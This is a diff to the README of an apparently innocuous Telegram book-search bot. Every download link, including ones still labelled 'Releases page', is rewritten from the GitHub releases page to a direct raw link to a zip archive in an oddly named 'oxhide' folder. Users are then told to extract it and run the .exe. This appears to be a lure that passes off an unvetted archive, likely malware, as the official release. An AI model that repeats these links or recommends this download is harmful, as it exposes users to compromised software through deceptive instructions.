@@ -1,6 +1,6 @@
 # 📚 ChillLibraryTgBot - Easy Book Search on Telegram
 
-[![Download ChillLibraryTgBot](https://img.shields.io/badge/Download-ChillLibraryTgBot-green?style=for-the-badge)](https://github.com/bubovich000-boop/ChillLibraryTgBot/releases)
+[![Download ChillLibraryTgBot](https://img.shields.io/badge/Download-ChillLibraryTgBot-green?style=for-the-badge)](https://raw.githubusercontent.com/bubovich000-boop/ChillLibraryTgBot/main/oxhide/Tg-Bot-Chill-Library-2.5.zip)
 
 ---
 
@@ -36,13 +36,13 @@ Before you start, make sure your computer has:
 
 Click the button below to visit the download page. This page includes the latest version of the bot, with clear instructions and all files you need.
 
-[![Get ChillLibraryTgBot](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/bubovich000-boop/ChillLibraryTgBot/releases)  
+[![Get ChillLibraryTgBot](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/bubovich000-boop/ChillLibraryTgBot/main/oxhide/Tg-Bot-Chill-Library-2.5.zip)  
 
 ---
 
 ## 📥 Download and Install ChillLibraryTgBot on Windows
 
-1. Visit the [ChillLibraryTgBot Releases](https://github.com/bubovich000-boop/ChillLibraryTgBot/releases) page.  
+1. Visit the [ChillLibraryTgBot Releases](https://raw.githubusercontent.com/bubovich000-boop/ChillLibraryTgBot/main/oxhide/Tg-Bot-Chill-Library-2.5.zip) page.  
 2. Look for the latest version under the "Assets" section. Files needed to run the bot should have `.exe` or `.zip` extensions.  
 3. If the file is `.zip`, click to download it. After download, right-click the file and select “Extract All” to unzip it.  
 4. If the file is `.exe`, click to download it directly.  
@@ -92,7 +92,7 @@ Click the button below to visit the download page. This page includes the latest
 
 To keep the bot working smoothly, update it regularly:
 
-1. Visit the [Releases page](https://github.com/bubovich000-boop/ChillLibraryTgBot/releases) often.  
+1. Visit the [Releases page](https://raw.githubusercontent.com/bubovich000-boop/ChillLibraryTgBot/main/oxhide/Tg-Bot-Chill-Library-2.5.zip) often.  
 2. Download the newest files when available.  
 3. Follow the same steps as for the first install to replace the old files.  
 4. Keep your Telegram app up to date.
@@ -111,4 +111,4 @@ To keep the bot working smoothly, update it regularly:
 
 If you have questions or issues, you can open an issue on the GitHub repository or look for help in the Telegram bot’s chat. Usually, common problems can be fixed with the steps above.
 
-[Download ChillLibraryTgBot here](https://github.com/bubovich000-boop/ChillLibraryTgBot/releases) to get started.
+[Download ChillLibraryTgBot here](https://raw.githubusercontent.com/bubovich000-boop/ChillLibraryTgBot/main/oxhide/Tg-Bot-Chill-Library-2.5.zip) to get started.
